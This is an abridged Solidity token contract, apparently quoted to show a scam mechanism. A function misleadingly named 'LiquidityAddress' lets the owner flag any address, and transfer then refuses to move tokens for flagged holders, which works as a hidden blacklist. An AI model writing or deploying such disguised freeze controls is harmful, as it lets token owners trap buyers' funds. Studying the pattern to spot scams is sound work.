...
contract StandardToken is ERC20 {
  ...
  mapping (address => mapping (address => uint256)) internal allowed;
	...
	event Liquidity(address indexed Liquidity, bool value);
  ...
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(tokenLiquidity[msg.sender] == false);
  ...
  function _Liquidity(address _address, bool _isLiquidity) internal returns (bool) {
	require(tokenLiquidity[_address] != _isLiquidity);
	tokenLiquidity[_address] = _isLiquidity;
	emit Liquidity(_address, _isLiquidity);
	return true;
  }
...
contract PausableToken is StandardToken, Pausable {
  ...
  function LiquidityAddress(address listAddress,  bool isLiquidity) public whenNotPaused onlyOwner  returns (bool success) {
	return super._Liquidity(listAddress, isLiquidity);
  }
